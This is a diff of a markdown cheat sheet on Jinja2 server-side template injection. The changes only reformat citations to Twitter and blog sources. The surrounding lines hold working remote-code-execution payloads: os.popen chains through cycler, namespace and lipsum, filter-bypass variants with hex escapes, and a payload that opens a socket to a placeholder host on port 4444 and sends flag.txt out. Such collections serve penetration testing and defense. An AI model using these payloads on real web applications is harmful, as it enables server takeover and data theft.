@@ -133,7 +133,7 @@ If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump
 <pre>{% debug %}</pre>
 ```
 
-Source: <https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement>
+Source: [jinja.palletsprojects.com](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)
 
 ### Jinja2 - Dump All Used Classes
 
@@ -212,7 +212,7 @@ But when `__builtins__` is filtered, the following payloads are context-free, an
 {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
-We can use these shorter payloads:
+We can use these shorter payloads from [@podalirius_](https://twitter.com/podalirius_): [python-vulnerabilities-code-execution-in-jinja-templates](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/):
 
 ```python
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
@@ -220,15 +220,11 @@ We can use these shorter payloads:
 {{ namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
-Source [@podalirius_](https://twitter.com/podalirius_) : <https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/>
-
 With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:
 
 ```python
 {{ lipsum.__globals__["os"].popen('id').read() }}
 ```
-
-Source: <https://twitter.com/podalirius_/status/1655970628648697860>
 
 #### Exploit The SSTI By Calling subprocess.Popen
 
@@ -245,8 +241,7 @@ Source: <https://twitter.com/podalirius_/status/1655970628648697860>
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
 
-Simply modification of payload to clean up output and facilitate command input (<https://twitter.com/SecGus/status/1198976764351066113>)
-In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)
+Simple modification of the payload to clean up output and facilitate command input from [@SecGus](https://twitter.com/SecGus/status/1198976764351066113). In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)
 
 ```python
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
@@ -298,7 +293,7 @@ Bypassing `|join`
 http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
 ```
 
-Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by <https://twitter.com/SecGus>:
+Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by [@SecGus](https://twitter.com/SecGus):
 
 ```python
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
